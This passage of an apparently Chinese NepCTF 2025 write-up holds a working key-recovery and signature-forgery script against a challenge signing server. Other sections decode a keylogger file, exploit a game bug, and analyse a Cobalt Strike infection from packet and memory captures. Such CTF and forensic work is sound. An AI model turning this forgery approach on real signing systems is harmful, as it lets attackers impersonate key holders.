class="string">&quot;解析失败: &#123;e&#125;, 签名: &#123;sig_line&#125;&quot;</span>)</span><br><span class="line">                    # 重试相同k值</span><br><span class="line">        except <span class="title class_">EOFError</span>:</span><br><span class="line">            <span class="title function_">print</span>(<span class="string">&quot;连接中断，尝试重连...&quot;</span>)</span><br><span class="line">            # 重新连接</span><br><span class="line">            ssock = <span class="title function_">create_ssl_connection</span>(host, port)</span><br><span class="line">            <span class="keyword">if</span> not <span class="attr">ssock</span>:</span><br><span class="line">                <span class="title function_">print</span>(<span class="string">&quot;重连失败&quot;</span>)</span><br><span class="line">                sys.<span class="title function_">exit</span>(<span class="number">1</span>)</span><br><span class="line">            r = remote.<span class="title function_">fromsocket</span>(ssock)</span><br><span class="line">            r.<span class="title function_">recvuntil</span>(b<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">        except <span class="title class_">Exception</span> <span class="keyword">as</span> <span class="attr">e</span>:</span><br><span class="line">            <span class="title function_">print</span>(f<span class="string">&quot;错误: &#123;e&#125;&quot;</span>)</span><br><span class="line">            time.<span class="title function_">sleep</span>(<span class="number">1</span>)  # 短暂等待后重试</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;开始恢复私钥(32-47)...&quot;</span>)</span><br><span class="line"># 恢复私钥: 后<span class="number">16</span>个索引 (k=<span class="number">32</span> 到 <span class="number">47</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">32</span>, <span class="number">48</span>):</span><br><span class="line">    i = k - <span class="number">32</span></span><br><span class="line">    symbol = hex_symbols[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="title class_">True</span>:</span><br><span class="line">        <span class="attr">try</span>:</span><br><span class="line">            # 生成随机消息</span><br><span class="line">            msg_bytes = os.<span class="title function_">urandom</span>(<span class="number">10</span>)</span><br><span class="line">            msg_hex = msg_bytes.<span class="title function_">hex</span>()</span><br><span class="line">            # 计算<span class="title class_">SM3</span>哈希</span><br><span class="line">            m_hex = <span class="title class_">SM3</span>(msg_bytes)</span><br><span class="line">            # 检查符号是否未出现</span><br><span class="line">            <span class="keyword">if</span> symbol not <span class="keyword">in</span> <span class="attr">m_hex</span>:</span><br><span class="line">                # 请求签名</span><br><span class="line">                r.<span class="title function_">sendline</span>(b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                r.<span class="title function_">recvuntil</span>(b<span class="string">&#x27;msg: &#x27;</span>)</span><br><span class="line">                r.<span class="title function_">sendline</span>(msg_hex.<span class="title function_">encode</span>())</span><br><span class="line">                sig_line = r.<span class="title function_">recvline</span>().<span class="title function_">decode</span>().<span class="title function_">strip</span>()</span><br><span class="line">                # 确保接收到提示符</span><br><span class="line">                <span class="attr">try</span>:</span><br><span class="line">                    r.<span class="title function_">recvuntil</span>(b<span class="string">&#x27;&gt;&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">                <span class="attr">except</span>:</span><br><span class="line">                    pass</span><br><span class="line"></span><br><span class="line">                <span class="attr">try</span>:</span><br><span class="line">                    qq_list = ast.<span class="title function_">literal_eval</span>(sig_line)</span><br><span class="line">                    sk_recovered[k] = bytes.<span class="title function_">fromhex</span>(qq_list[k])</span><br><span class="line">                    <span class="title function_">print</span>(f<span class="string">&quot;成功恢复私钥[&#123;k&#125;]&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                except <span class="title class_">Exception</span> <span class="keyword">as</span> <span class="attr">e</span>:</span><br><span class="line">                    <span class="title function_">print</span>(f<span class="string">&quot;解析失败: &#123;e&#125;, 签名: &#123;sig_line&#125;&quot;</span>)</span><br><span class="line">                    # 重试相同k值</span><br><span class="line">        except <span class="title class_">EOFError</span>:</span><br><span class="line">            <span class="title function_">print</span>(<span class="string">&quot;连接中断，尝试重连...&quot;</span>)</span><br><span class="line">            # 重新连接</span><br><span class="line">            ssock = <span class="title function_">create_ssl_connection</span>(host, port)</span><br><span class="line">            <span class="keyword">if</span> not <span class="attr">ssock</span>:</span><br><span class="line">                <span class="title function_">print</span>(<span class="string">&quot;重连失败&quot;</span>)</span><br><span class="line">                sys.<span class="title function_">exit</span>(<span class="number">1</span>)</span><br><span class="line">            r = remote.<span class="title function_">fromsocket</span>(ssock)</span><br><span class="line">            r.<span class="title function_">recvuntil</span>(b<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">        except <span class="title class_">Exception</span> <span class="keyword">as</span> <span class="attr">e</span>:</span><br><span class="line">            <span class="title function_">print</span>(f<span class="string">&quot;错误: &#123;e&#125;&quot;</span>)</span><br><span class="line">            time.<span class="title function_">sleep</span>(<span class="number">1</span>)  # 短暂等待后重试</span><br><span class="line"></span><br><span class="line"># 为目标消息生成签名</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;正在为目标消息生成签名...&quot;</span>)</span><br><span class="line">msg_target = b<span class="string">&quot;happy for NepCTF 2025&quot;</span></span><br><span class="line">m_hex = <span class="title class_">SM3</span>(msg_target)  # 哈希</span><br><span class="line">m_bin = <span class="title function_">bin</span>(<span class="title function_">int</span>(m_hex, <span class="number">16</span>))[<span class="number">2</span>:].<span class="title function_">zfill</span>(<span class="number">256</span>)  # 二进制串</span><br><span class="line"></span><br><span class="line"># 计算step数组</span><br><span class="line">step = [<span class="number">0</span>] * <span class="number">48</span></span><br><span class="line"># 前<span class="number">32</span>个step</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">32</span>):</span><br><span class="line">    byte_bin = m_bin[<span class="number">8</span> * <span class="attr">i</span>:<span class="number">8</span> * i + <span class="number">8</span>]</span><br><span class="line">    step[i] = <span class="title function_">int</span>(byte_bin, <span class="number">2</span>)  # a[i]</span><br><span class="line"># 后<span class="number">16</span>个step</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">16</span>):</span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">1</span>, <span class="number">65</span>):  # 位置<span class="number">1</span>-<span class="number">64</span></span><br><span class="line">        <span class="keyword">if</span> m_hex[j - <span class="number">1</span>] == hex_symbols[i]:</span><br><span class="line">            total += j</span><br><span class="line">    step[<span class="number">32</span> + i] = total % <span class="number">255</span></span><br><span class="line"></span><br><span class="line"># 计算qq_target</span><br><span class="line">qq_target = []</span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">48</span>):</span><br><span class="line">    qq_hex = <span class="title class_">SM3</span>_n(sk_recovered[idx], step[idx], <span class="number">256</span>)</span><br><span class="line">    qq_target.<span class="title function_">append</span>(qq_hex)</span><br><span class="line">    <span class="title function_">print</span>(f<span class="string">&quot;计算签名[&#123;idx&#125;]&quot;</span>)</span><br><span class="line"></span><br><span class="line"># 提交签名</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;正在提交签名...&quot;</span>)</span><br><span class="line"><span class="attr">try</span>:</span><br><span class="line">    r.<span class="title function_">sendline</span>(b<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.<span class="title function_">recvuntil</span>(b<span class="string">&#x27;give me a qq: &#x27;</span>)</span><br><span class="line">    # 确保使用可解析的格式</span><br><span class="line">    signature_str = <span class="title function_">str</span>(qq_target).<span class="title function_">replace</span>(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">    r.<span class="title function_">sendline</span>(signature_str.<span class="title function_">encode</span>())</span><br><span class="line">    flag_output = r.<span class="title function_">recvall</span>(timeout=<span class="number">10</span>).<span class="title function_">decode</span>()</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;旗帜结果:&quot;</span>)</span><br><span class="line">    <span class="title function_">print</span>(flag_output)</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">except <span class="title class_">Exception</span> <span class="keyword">as</span> <span class="attr">e</span>:</span><br><span class="line">    <span class="title function_">print</span>(f<span class="string">&quot;提交签名失败: &#123;e&#125;&quot;</span>)</span><br><span class="line"><span class="attr">finally</span>:</span><br><span class="line">    r.<span class="title function_">close</span>()</span><br></pre></td></tr></table></figure>

<p><img src="/image%2014.png" alt="image.png"></p>
<p>NepCTF{fb3ea54a-9991-2bad-57ce-7600be5d25c2}</p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="NepBotEvent"><a href="#NepBotEvent" class="headerlink" title="NepBotEvent"></a><strong>NepBotEvent</strong></h2><p>查看题目发现是键盘记录器，那就说明要提取键盘流量，写个脚本提取一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 键码到字符映射（小写）</span></span><br><span class="line">keycode_map = &#123;</span><br><span class="line">    <span class="number">2</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;3&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;4&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">    <span class="number">7</span>: <span class="string">&#x27;6&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;7&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;8&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;9&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="number">12</span>: <span class="string">&#x27;-&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;=&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;[BACKSPACE]&#x27;</span>,</span><br><span class="line">    <span class="number">15</span>: <span class="string">&#x27;\t&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;q&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;e&#x27;</span>, <span class="number">19</span>: <span class="string">&#x27;r&#x27;</span>,</span><br><span class="line">    <span class="number">20</span>: <span class="string">&#x27;t&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;y&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;o&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">    <span class="number">26</span>: <span class="string">&#x27;[&#x27;</span>, <span class="number">27</span>: <span class="string">&#x27;]&#x27;</span>, <span class="number">28</span>: <span class="string">&#x27;\n&#x27;</span>,</span><br><span class="line">    <span class="number">30</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">31</span>: <span class="string">&#x27;s&#x27;</span>, <span class="number">32</span>: <span class="string">&#x27;d&#x27;</span>, <span class="number">33</span>: <span class="string">&#x27;f&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">    <span class="number">35</span>: <span class="string">&#x27;h&#x27;</span>, <span class="number">36</span>: <span class="string">&#x27;j&#x27;</span>, <span class="number">37</span>: <span class="string">&#x27;k&#x27;</span>, <span class="number">38</span>: <span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">    <span class="number">39</span>: <span class="string">&#x27;;&#x27;</span>, <span class="number">40</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="number">41</span>: <span class="string">&#x27;`&#x27;</span>,</span><br><span class="line">    <span class="number">44</span>: <span class="string">&#x27;z&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;x&#x27;</span>, <span class="number">46</span>: <span class="string">&#x27;c&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;v&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">    <span class="number">49</span>: <span class="string">&#x27;n&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;m&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;,&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;.&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="number">57</span>: <span class="string">&#x27; &#x27;</span>,  <span class="comment"># 空格</span></span><br><span class="line">    <span class="number">42</span>: <span class="string">&#x27;[SHIFT_L]&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;[SHIFT_R]&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;[CTRL]&#x27;</span>, <span class="number">56</span>: <span class="string">&#x27;[ALT]&#x27;</span>,</span><br><span class="line">    <span class="number">58</span>: <span class="string">&#x27;[CAPSLOCK]&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对应带shift的字符映射，注意只列常见数字符号，字母由代码处理</span></span><br><span class="line">shift_map = &#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;-&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;[&#x27;</span>: <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;]&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>: <span class="string">&#x27;|&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;;&#x27;</span>: <span class="string">&#x27;:&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>: <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;,&#x27;</span>: <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>: <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;`&#x27;</span>: <span class="string">&#x27;~&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_events</span>(<span class="params">data</span>):</span><br><span class="line">    capslock = <span class="literal">False</span></span><br><span class="line">    shift_pressed = <span class="literal">False</span></span><br><span class="line">    output = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">24</span>):</span><br><span class="line">        event = data[i:i+<span class="number">24</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(event) &lt; <span class="number">24</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        _, _, type_, code, value = struct.unpack(<span class="string">&#x27;qqHHI&#x27;</span>, event)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 处理按键事件</span></span><br><span class="line">        <span class="keyword">if</span> type_ == <span class="number">1</span>:</span><br><span class="line">            key = keycode_map.get(code, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> key:</span><br><span class="line">                <span class="comment"># 未知键码忽略</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> key <span class="keyword">in</span> [<span class="string">&#x27;[SHIFT_L]&#x27;</span>, <span class="string">&#x27;[SHIFT_R]&#x27;</span>]:</span><br><span class="line">                shift_pressed = (value == <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> key == <span class="string">&#x27;[CAPSLOCK]&#x27;</span> <span class="keyword">and</span> value == <span class="number">1</span>:</span><br><span class="line">                capslock = <span class="keyword">not</span> capslock</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> value == <span class="number">1</span>:  <span class="comment"># 按下事件</span></span><br><span class="line">                <span class="keyword">if</span> key == <span class="string">&#x27;[BACKSPACE]&#x27;</span>:</span><br><span class="line">                    <span class="keyword">if</span> output:</span><br><span class="line">                        output.pop()</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment"># 处理字母大小写</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(key) == <span class="number">1</span> <span class="keyword">and</span> key.isalpha():</span><br><span class="line">                    <span class="keyword">if</span> capslock ^ shift_pressed:</span><br><span class="line">                        output.append(key.upper())</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        output.append(key.lower())</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment"># 处理数字和符号带shift映射</span></span><br><span class="line">                <span class="keyword">if</span> shift_pressed <span class="keyword">and</span> key <span class="keyword">in</span> shift_map:</span><br><span class="line">                    output.append(shift_map[key])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    output.append(key)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_keylogger</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;读取文件失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> process_events(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    filepath = <span class="string">r&quot;C:\Users\Jiker\Downloads\nepbotevent\NepBot_keylogger&quot;</span></span><br><span class="line">    result = decode_keylogger(filepath)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 优化后恢复按键序列如下：\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/image%2015.png" alt="image.png"></p>
<p>发现数据库NepCTF-20250725-114514</p>
<h2 id="SpeedMino"><a href="#SpeedMino" class="headerlink" title="SpeedMino"></a><strong>SpeedMino</strong></h2><p>俄罗斯方块，没想着逆向，发现程序有个bug，hold选项可以让方块一直不落地，也就是不可能死，等到2600自然结果就出了，但是太久了，写个连点器</p>
<p>最后得到NepCTF{You_ARE_SpeedMino_GRAND-MASTER_ROUNDS!_TGLKZ}</p>
<h2 id="客服小美"><a href="#客服小美" class="headerlink" title="客服小美"></a><strong>客服小美</strong></h2><p>题目给了两个文件，一个是流量包DESKTOP.pcapng，一个是内存镜像DESKTOP.raw</p>
<p>先分析流量包</p>
<p>过滤出http的流量来，一看就看出是cs的特征来</p>
<p><img src="/2025-07-27-16-11-15-image.png" alt="2025-07-27-16-11-15-image.png"></p>
<p>目的地址跟目的端口就是木马回连地址：</p>
<p>192.168.27.132:12580</p>
<p>使用LovelyMem对内存镜像DESKTOP.raw进行取证</p>
<p><img src="/2025-07-28-09-31-12-image.png" alt="2025-07-28-09-31-12-image.png"></p>
<p>在进程分析中，发现了木马程序“关于2025年部分节假日安排的通知.exe”，并且执行此木马的权限为用户JohnDoe，所以JohnDoe就是被控机器的用户名</p>
<p>在网络信息中</p>
<p><img src="/2025-07-28-09-33-52-image.png" alt="2025-07-28-09-33-52-image.png"></p>
<p>也证实了木马会连地址：<br>192.168.27.132:12580</p>
<p>至于题目中被顺走的敏感信息，需要解密流量包中加密的cs通信流量</p>
<p>CobaltStrike网络流量可以使用正确的AES和HMAC密钥进行解密。可以从内存转储文件中获取AES和HMAC密钥</p>
<p>使用LovelyMem对6492进程进行转储，到处minidump_pid_6492.dmp</p>
<p><img src="/2025-07-28-09-41-47-image.png" alt="2025-07-28-09-41-47-image.png"></p>
<p>使用 <code>cs-extract-key.py</code> 查找并解码元数据</p>
<p><a target="_blank" rel="noopener" href="https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py">https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py</a></p>
<p>对于 Cobalt Strike 4.x 的 Beacon，通过内存直接提取未加密元数据的可能性变得极低了。因为此时已经没有数据头来进行标识了，单纯的 16 字节长序列没有可区分的特征。只能通过在进程内存中找到所有可能的 16 字节长非空序列作为密钥字典，不断尝试解密 C&amp;C 通信，碰撞成功就找到了密钥。</p>
<p>提取方式例如 <code>cs-parse-http-traffic.py -k unknown capture.pcapng</code>， <code>-k</code> 表示密钥未知，该工具尝试提取加密数据流量：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py">https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py</a></p>
<p>python cs-parse-http-traffic.py -k unknown DESKTOP.pcapng</p>
<p><img src="/2025-07-28-09-51-17-image.png" alt="2025-07-28-09-51-17-image.png"></p>
<p>随便拿一组数据来说</p>
<p>数据包83是对数据包80的GET请求的HTTP响应，响应数据长48字节（ac4cb985c04d084b0f77ed1b7745b23123abb198370ffcaedebf12c1f9de9b6fb6094a50a93af84cacd11a30b468dfbd）。</p>
<p>这应该就是 Team Server 发送给 Beacon 的加密数据，通过 <code>cs-extract-key.py -t ac4cb985c04d084b0f77ed1b7745b23123abb198370ffcaedebf12c1f9de9b6fb6094a50a93af84cacd11a30b468dfbd minidump_pid_6492.dmp</code> 尝试提取密钥：</p>
<p>python cs-extract-key.py -t ac4cb985c04d084b0f77ed1b7745b23123abb198370ffcaedebf12c1f9de9b6fb6094a50a93af84cacd11a30b468dfbd minidump_pid_6492.dmp</p>
<p><img src="/2025-07-28-09-57-37-image.png" alt="2025-07-28-09-57-37-image.png"></p>
<p>AES Key:  a6f4a04f8a6aa5ff27a5bcdd5ef3b9a7<br>HMAC Key: 35d34ac8778482751682514436d71e09</p>
<p>解密脚本如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">import hmac</span><br><span class="line">import binascii</span><br><span class="line">import base64</span><br><span class="line">import hexdump</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"># 密钥定义</span><br><span class="line">AES_KEY = binascii.unhexlify(&quot;a6f4a04f8a6aa5ff27a5bcdd5ef3b9a7&quot;)</span><br><span class="line">HMAC_KEY = binascii.unhexlify(&quot;35d34ac8778482751682514436d71e09&quot;)</span><br><span class="line"></span><br><span class="line"># 加密数据</span><br><span class="line">encrypted_data_str = &quot;00000050350ca7f4379f30cc9d6d671db886d360691c74467156e60e8356725ae2f3b880b302ea8b5556df10324e86e53ecb84046646a1758e9cb8c7fca42d660617be467627abcc3c0ce3bd3e93c02fffcb4d3a&quot;</span><br><span class="line"></span><br><span class="line">def decrypt(encrypted_data, iv_bytes, signature, aes_key, hmac_key):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    解密函数，使用AES-CBC模式解密数据并验证HMAC签名</span><br><span class="line"></span><br><span class="line">    参数:</span><br><span class="line">    encrypted_data (bytes): 待解密的数据</span><br><span class="line">    iv_bytes (bytes): 初始化向量</span><br><span class="line">    signature (bytes): HMAC签名</span><br><span class="line">    aes_key (bytes): AES解密密钥</span><br><span class="line">    hmac_key (bytes): HMAC验证密钥</span><br><span class="line"></span><br><span class="line">    返回:</span><br><span class="line">    bytes: 解密后的数据，如果HMAC验证失败则返回None</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    # 计算HMAC并验证签名</span><br><span class="line">    expected_hmac = hmac.new(hmac_key, encrypted_data, digestmod=&quot;sha256&quot;).digest()[:16]</span><br><span class="line">    if not hmac.compare_digest(expected_hmac, signature):</span><br><span class="line">        print(&quot;message authentication failed&quot;)</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    # 使用AES-CBC模式解密</span><br><span class="line">    cipher = AES.new(aes_key, AES.MODE_CBC, iv_bytes)</span><br><span class="line">    return cipher.decrypt(encrypted_data)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    &quot;&quot;&quot;主函数，处理解密流程并输出结果&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        # 转换加密数据为字节类型</span><br><span class="line">        encrypted_data = bytes.fromhex(encrypted_data_str.replace(&#x27;\n&#x27;, &#x27;&#x27;))</span><br><span class="line"></span><br><span class="line">        # 解析数据长度</span><br><span class="line">        data_length = int.from_bytes(encrypted_data[:4], byteorder=&#x27;big&#x27;, signed=False)</span><br><span class="line">        data_part = encrypted_data[4:]</span><br><span class="line"></span><br><span class="line">        # 分离加密数据和签名</span><br><span class="line">        encrypted_content = data_part[:data_length-16]</span><br><span class="line">        signature = data_part[data_length-16:data_length]</span><br><span class="line"></span><br><span class="line">        # 固定的初始化向量</span><br><span class="line">        iv_bytes = 